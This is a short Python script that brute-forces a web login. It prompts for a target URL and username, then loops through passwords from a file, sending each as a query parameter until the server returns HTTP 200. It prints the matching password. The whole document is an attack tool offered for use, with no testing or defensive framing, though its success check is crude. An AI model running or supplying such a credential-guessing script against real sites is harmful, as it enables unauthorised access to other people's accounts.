import requests
from requests.auth import HTTPBasicAuth

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")

password_file = open("passwords.txt", "r").readlines()

for line in password_file:
    password = line.strip()
    response = requests.get(url + "?login=" + username + "&pass=" + password)
    print(f"trying with password: {password}")
    if (response.status_code == 200):
        print(f"Password ------------- {password}")
        break
